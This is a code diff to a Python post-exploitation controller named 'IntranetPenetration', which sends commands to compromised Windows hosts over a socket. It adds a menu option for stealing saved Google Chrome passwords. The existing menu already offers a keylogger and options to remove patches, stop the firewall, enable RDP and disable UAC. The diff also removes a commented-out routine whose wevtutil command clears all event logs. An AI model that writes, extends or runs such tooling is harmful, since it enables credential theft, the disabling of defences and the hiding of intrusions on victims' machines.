@@ -4,6 +4,7 @@ from prompt_toolkit import prompt
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
 from IntranetPenetration.SmallTools import keyboard
+from IntranetPenetration.SmallTools import GetChromePassword
 
 from AuxiliaryFunctions import MyTable
 
@@ -38,14 +39,14 @@ class SmallTools:
                 elif choice == '4':
                     self.OpenRDP(conn)
                     continue
-                # elif choice == '5':
-                #     self.DeleteLogs(conn)
-                #     continue
                 elif choice == '5':
                     keyboard.keyboard(conn)
                     continue
                 elif choice == '6':
                     self.closeUAC(conn)
+                    continue
+                elif choice == '7':
+                    GetChromePassword.getChromePassword(conn)
                     continue
             except KeyboardInterrupt:
                 print("exiting......")
@@ -66,7 +67,8 @@ class SmallTools:
         print("\n" + '\033[1;34;34m' + "Small Tools" + '\033[0m' + "\n" + '=' * len("Small Tools") + "\n")
         headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
         mydata = [["1", "screenshot", "1 screenshot_name", "截图"], ["2", "Remove patch", "2", "删除补丁"], ["3", "service iptables stop", "3", "关闭防火墙"],
-                  ["4", "Enable RDP", "4", "开启RDP"], ["5", "Keyloggers", "5", "键盘记录器"], ["6", "close UAC", "6", "关闭UAC"]]
+                  ["4", "Enable RDP", "4", "开启RDP"], ["5", "Keyloggers", "5", "键盘记录器"], ["6", "close UAC", "6", "关闭UAC"],
+                  ["7", "Stealing passwords from Google Chrome", "7", "盗取谷歌浏览器的密码"]]
         MyTable.createTable(headers, mydata)
 
     # 1
@@ -168,22 +170,6 @@ class SmallTools:
                 continue
             command = "rdesktop -p {} -u {} {}".format(choice.split()[0], choice.split()[1], choice.split()[2])
             os.system(command)
-
-    # def DeleteLogs(self, conn):
-    #     command = "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\" > lk.txt && type lk.txt && DEL lk.txt"
-    #     conn.sendall(command.encode("gbk"))
-    #     result_len = conn.recv(4)
-    #     real_len = struct.unpack("i", result_len)[0]
-    #     while True:
-    #         if 1024 < real_len:
-    #             result = conn.recv(1024).decode("gbk", errors="ignore")
-    #             print(result)
-    #             real_len = real_len - 1024
-    #             continue
-    #         else:
-    #             result = conn.recv(1024).decode("gbk", errors="ignore")
-    #             print(result)
-    #             break
 
     def receive(self, conn, command):
         conn.sendall(command.encode("gbk"))
